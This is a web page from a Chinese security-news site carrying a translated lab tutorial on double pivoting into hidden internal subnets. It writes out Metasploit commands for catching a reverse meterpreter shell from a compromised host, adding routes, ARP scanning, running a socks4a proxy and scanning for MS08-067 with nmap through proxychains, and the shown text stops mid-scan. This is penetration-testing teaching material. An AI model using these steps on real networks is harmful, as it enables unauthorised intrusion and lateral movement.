<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】多重转发渗透隐藏内网 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="渗透,内网"/>
    
        <meta name="description" content="本文主要讲攻击者通过利用多重转发渗透两个隐藏网段的过程。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】多重转发渗透隐藏内网</h2>
                <div class="article-msg">
                    <span class="time">2017-02-28 16:43:31</span>
                    
                                        <span class="read">阅读：18715次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3545"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3545" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/"
                             target="_blank">来源： pentest.blog</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=1255579132" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=1255579132" style="color:#848e99;">quanyechavshuo</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; text-indent: 0em;"><span style="text-indent: 2em; color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><img src="http://p4.qhimg.com/t01b5da639b29652502.jpg" title="t01b5da639b29652502.jpg" alt="http://p4.qhimg.com/t01b5da639b29652502.jpg"/></span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="text-indent: 2em; color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=1255579132" target="_blank" style="text-decoration: none;"><span style="text-indent: 2em; color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">quanyechavshuo</span></a><br/></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">预估稿费：150RMB</span></span></span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192);"><span style="font-weight: 900;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">投稿方式：发送邮件至<a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none; color: rgb(51, 51, 51); line-height: 28px;"><span style="color: rgb(0, 112, 192);">linwei#360.cn</span></a>，或登陆<a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-decoration: none; color: rgb(0, 112, 192); line-height: 28px;">网页版</a>在线投稿</span></span></span></p><p style="text-align: left; text-indent: 2em;"><br/></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x00 About</span></strong></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内网机器如下：</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p0.qhimg.com/t0139af40ff24750844.png" alt="final.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">说明:</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1)Attacker为攻击者,有一个网卡,网段为172.16.0.0,Attacker系统为kali系统</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2)RD为第一个已经渗透的目标,有两块网卡,对应172.16.0.0和7.7.7.0两个网段</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3)JC有两块网卡,对应7.7.7.0和8.8.8.0两个网段,JC有ms08-067和efs&nbsp;bof两个漏洞,可getshell</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4)SK有一块网卡,对应8.8.8.0网段,SK有vsftpd的漏洞,可getshell</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5)起初Attacker只拿到RD的msf的shell,对于目标内网情况一无所知,也不知道存在7.7.7.0和8.8.8.0这两个隐藏的网段</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6)目标是准备通过RD来渗透内网中7.7.7.0和8.8.8.0两个隐藏的网段</span><br/></p><p style="text-align: left; text-indent: 2em;"><br/></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x01 Step1</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Attacker在RD上通过webshell运行了一个reverse类型的后门,然后操作如下:</span></p><pre class="brush:bash;toolbar:false">msf&nbsp;&gt;&nbsp;use&nbsp;exploit/multi/handler&nbsp;
msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;payload&nbsp;windows/meterpreter/reverse_tcp
payload&nbsp;=&gt;&nbsp;windows/meterpreter/reverse_tcp
msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;172.16.0.20&nbsp;
LHOST&nbsp;=&gt;&nbsp;172.16.0.20msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;1234
LPORT&nbsp;=&gt;&nbsp;1234msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;run
[*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;172.16.0.20:1234&nbsp;
[*]&nbsp;Starting&nbsp;the&nbsp;payload&nbsp;handler...
[*]&nbsp;Sending&nbsp;stage&nbsp;(957487&nbsp;bytes)&nbsp;to&nbsp;172.16.0.11
[*]&nbsp;Meterpreter&nbsp;session&nbsp;2&nbsp;opened&nbsp;(172.16.0.20:1234&nbsp;-&gt;&nbsp;172.16.0.11:49162)meterpreter&nbsp;&gt;&nbsp;ifconfig
Interface&nbsp;&nbsp;1============
Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Software&nbsp;Loopback&nbsp;Interface&nbsp;1Hardware&nbsp;MAC&nbsp;:&nbsp;00:00:00:00:00:00MTU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;4294967295IPv4&nbsp;Address&nbsp;:&nbsp;127.0.0.1IPv4&nbsp;Netmask&nbsp;:&nbsp;255.0.0.0IPv6&nbsp;Address&nbsp;:&nbsp;::1IPv6&nbsp;Netmask&nbsp;:&nbsp;ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
Interface&nbsp;11============
Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Intel(R)&nbsp;PRO/1000&nbsp;MT&nbsp;Desktop&nbsp;Adapter
Hardware&nbsp;MAC&nbsp;:&nbsp;08:00:27:e1:3f:af
MTU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;1500IPv4&nbsp;Address&nbsp;:&nbsp;172.16.0.11IPv4&nbsp;Netmask&nbsp;:&nbsp;255.255.255.0Interface&nbsp;19============
Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Intel(R)&nbsp;PRO/1000&nbsp;MT&nbsp;Desktop&nbsp;Adapter&nbsp;#2Hardware&nbsp;MAC&nbsp;:&nbsp;08:00:27:7f:3c:fe
MTU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;1500IPv4&nbsp;Address&nbsp;:&nbsp;7.7.7.11IPv4&nbsp;Netmask&nbsp;:&nbsp;255.255.255.0</pre><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><br/></span></strong></p><p style="text-align: left; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">0x02 Step2</span></strong></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">发现RD有两块网卡后,想办法渗透另一个网段7.7.7.0,首先要添加路由[不添加路由也可以直接用meterpreter shell中的模块访问 到7.7.7.x网段,添加路由的目的是为了使得msf模块可以访问到7.7.7.x网段],meterpreter shell可以访问到7.7.7.x网段,msf 中的模块不能访问到7.7.7.x网段,msf中的模块所处的ip是攻击者的ip,meterpreter shell所处的ip是RD的ip.在meterpreter中 添加路由的目的是为了给msf模块作代理,也即给Attacker作代理,但是只能给Attacker的msf模块作代理,要想给Attacker的其他 应用程序作代理,则需要在meterpreter添加路由后再运行msf的开启sock4的模块,然后再用proxychains来设置Attacker的其他 应用程序的代理为msf的开启sock4代理模块中设置的代理入口。</span><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">操作如下:</span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;run&nbsp;autoroute&nbsp;-s&nbsp;7.7.7.0/24[*]&nbsp;Adding&nbsp;a&nbsp;route&nbsp;to&nbsp;7.7.7.0/255.255.255.0...
[+]&nbsp;Added&nbsp;route&nbsp;to&nbsp;7.7.7.0/255.255.255.0&nbsp;via&nbsp;172.16.0.11[*]&nbsp;Use&nbsp;the&nbsp;-p&nbsp;option&nbsp;to&nbsp;list&nbsp;all&nbsp;active&nbsp;routes
meterpreter&nbsp;&gt;&nbsp;run&nbsp;autoroute&nbsp;-p
Active&nbsp;Routing&nbsp;Table
====================
&nbsp;Subnet&nbsp;Netmask&nbsp;Gateway
&nbsp;------&nbsp;-------&nbsp;-------&nbsp;7.7.7.0&nbsp;255.255.255.0&nbsp;Session&nbsp;2meterpreter&nbsp;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后开始扫描7.7.7.0网段,操作如下:</span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;run&nbsp;post/windows/gather/arp_scanner&nbsp;RHOSTS=7.7.7.0/24[*]&nbsp;Running&nbsp;module&nbsp;against&nbsp;DISCORDIA
[*]&nbsp;ARP&nbsp;Scanning&nbsp;7.7.7.0/24[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP:&nbsp;7.7.7.11&nbsp;MAC&nbsp;08:00:27:7f:3c:fe&nbsp;(CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)
[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP&nbsp;&nbsp;7.7.7.12&nbsp;MAC&nbsp;08:00:27:3a:b2:c1&nbsp;(CADMUS&nbsp;CIMPUTER&nbsp;SYSTEMS)
[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP:&nbsp;7.7.7.20&nbsp;MAC&nbsp;08:00:27:fa:a0:c5&nbsp;(CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)
[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP:&nbsp;7.7.7.255&nbsp;MAC&nbsp;08:00:27:3f:2a:b5&nbsp;(CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)
meterpreter&nbsp;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">arp_scanner不太够用,不能扫到端口信息[此时也可用msf自带的其他可以扫描端口的模块如auxiliary/scanner/portscan/tcp来扫 描,因为前面添加了路由,使得msf中的模块可以用meterpreter作为代理访问到7.7.7.x网段],于是用Attacker本机的nmap来扫[可以 更完全的扫描,nmap应该比msf中的扫描模块强大],首先在RD上开sockets4代理,然后用proxychains设置nmap的代理为msf模块开 启的Attacker的1080端口提供的代理,操作如下:</span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;background&nbsp;
[*]&nbsp;Backgrounding&nbsp;session&nbsp;2...
msf&nbsp;&gt;&nbsp;use&nbsp;auxiliary/server/socks4a&nbsp;
msf&nbsp;auxiliary(socks4a)&nbsp;&gt;&nbsp;show&nbsp;options&nbsp;
Module&nbsp;options&nbsp;(auxiliary/server/socks4a):
&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;SRVHOST&nbsp;&nbsp;0.0.0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;address&nbsp;to&nbsp;listen&nbsp;on
&nbsp;&nbsp;&nbsp;SRVPORT&nbsp;&nbsp;1080&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;port&nbsp;to&nbsp;listen&nbsp;on.
Auxiliary&nbsp;action:
&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;Proxy&nbsp;&nbsp;
msf&nbsp;auxiliary(socks4a)&nbsp;&gt;&nbsp;set&nbsp;srvhost&nbsp;172.16.0.20
srvhost&nbsp;=&gt;&nbsp;172.16.0.20msf&nbsp;auxiliary(socks4a)&nbsp;&gt;&nbsp;run
[*]&nbsp;Auxiliary&nbsp;module&nbsp;execution&nbsp;completed
[*]&nbsp;Starting&nbsp;the&nbsp;socks4a&nbsp;proxy&nbsp;server
msf&nbsp;auxiliary(socks4a)&nbsp;&gt;&nbsp;netstat&nbsp;-antp&nbsp;|&nbsp;grep&nbsp;1080
[*]&nbsp;exec:&nbsp;netstat&nbsp;-antp&nbsp;|&nbsp;grep&nbsp;1080
tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.0.20:1080&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3626/ruby&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
msf&nbsp;auxiliary(socks4a)&nbsp;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">proxychains设置/etc/proxychains.conf如下:</span></p><pre class="brush:bash;toolbar:false">[ProxyList]#&nbsp;add&nbsp;proxy&nbsp;here&nbsp;...#&nbsp;meanwile#&nbsp;defaults&nbsp;set&nbsp;to&nbsp;&quot;tor&quot;#socks4&nbsp;&nbsp;127.0.0.1&nbsp;9050socks4&nbsp;&nbsp;172.16.0.20&nbsp;1080</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">nmap扫描如下:</span></p><pre class="brush:bash;toolbar:false">root@kali:~#&nbsp;proxychains&nbsp;nmap&nbsp;-sT&nbsp;-sV&nbsp;-Pn&nbsp;-n&nbsp;-p22,80,135,139,445&nbsp;--script=smb-vuln-ms08-067.nse&nbsp;7.7.7.20ProxyChains-3.1&nbsp;(http://proxychains.sf.net)Starting&nbsp;Nmap&nbsp;7.25BETA1&nbsp;(&nbsp;https://nmap.org&nbsp;)|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:80-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:139-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:135-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:445-&lt;&gt;&lt;&gt;-OK
Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;7.7.7.20Host&nbsp;is&nbsp;up&nbsp;(0.17s&nbsp;latency).
PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;&nbsp;&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION
22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bitvise&nbsp;WinSSHD&nbsp;7.16&nbsp;(FlowSsh&nbsp;7.15;&nbsp;protocol&nbsp;2.0)80/tcp&nbsp;&nbsp;&nbsp;closed&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Easy&nbsp;File&nbsp;Sharing&nbsp;Web&nbsp;Server&nbsp;httpd&nbsp;6.9
135/tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC
139/tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;netbios-ssn&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;netbios-ssn
